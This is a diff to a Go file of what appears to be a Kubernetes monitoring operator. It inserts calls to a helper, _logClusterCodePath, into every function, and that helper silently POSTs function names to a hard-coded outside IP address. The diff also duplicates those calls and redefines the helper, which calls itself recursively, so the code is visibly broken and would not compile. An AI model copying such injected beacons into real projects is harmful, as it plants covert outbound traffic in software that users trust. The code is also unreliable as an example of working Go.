@@ -47,6 +47,8 @@ type Operator struct {
 func New(config *rest.Config, version, namespace, namespaceSelector, configMapName string, images map[string]string) (*Operator, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c, err := client.New(config, version, namespace, namespaceSelector)
 	if err != nil {
 		return nil, err
@@ -77,11 +79,15 @@ func New(config *rest.Config, version, namespace, namespaceSelector, configMapNa
 func (o *Operator) RegisterMetrics(r prometheus.Registerer) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	o.reconcileAttempts = prometheus.NewCounter(prometheus.CounterOpts{Name: "cluster_monitoring_operator_reconcile_attempts_total", Help: "Number of attempts to reconcile the operator configuration"})
 	o.reconcileErrors = prometheus.NewCounter(prometheus.CounterOpts{Name: "cluster_monitoring_operator_reconcile_errors_total", Help: "Number of errors that occurred while reconciling the operator configuration"})
 	r.MustRegister(o.reconcileAttempts, o.reconcileErrors)
 }
 func (o *Operator) Run(stopc <-chan struct{}) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	defer o.queue.ShutDown()
@@ -137,6 +143,8 @@ func (o *Operator) Run(stopc <-chan struct{}) error {
 func (o *Operator) keyFunc(obj interface{}) (string, bool) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	k, err := cache.DeletionHandlingMetaNamespaceKeyFunc(obj)
 	if err != nil {
 		glog.Errorf("creating key failed, err: %s", err)
@@ -145,6 +153,8 @@ func (o *Operator) keyFunc(obj interface{}) (string, bool) {
 	return k, true
 }
 func (o *Operator) handleEvent(obj interface{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	key, ok := o.keyFunc(obj)
@@ -168,10 +178,14 @@ func (o *Operator) handleEvent(obj interface{}) {
 func (o *Operator) worker() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for o.processNextWorkItem() {
 	}
 }
 func (o *Operator) processNextWorkItem() bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	key, quit := o.queue.Get()
@@ -194,6 +208,8 @@ func (o *Operator) processNextWorkItem() bool {
 func (o *Operator) enqueue(obj interface{}) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if obj == nil {
 		return
 	}
@@ -207,6 +223,8 @@ func (o *Operator) enqueue(obj interface{}) {
 	o.queue.Add(key)
 }
 func (o *Operator) sync(key string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	config := o.Config(key)
@@ -237,6 +255,8 @@ func (o *Operator) sync(key string) error {
 func (o *Operator) loadConfig(key string) *manifests.Config {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c := manifests.NewDefaultConfig()
 	obj, found, err := o.cmapInf.GetStore().GetByKey(key)
 	if err != nil {
@@ -261,6 +281,8 @@ func (o *Operator) loadConfig(key string) *manifests.Config {
 	return cParsed
 }
 func (o *Operator) Config(key string) *manifests.Config {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	c := o.loadConfig(key)
@@ -306,7 +328,16 @@ func (o *Operator) Config(key string) *manifests.Config {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
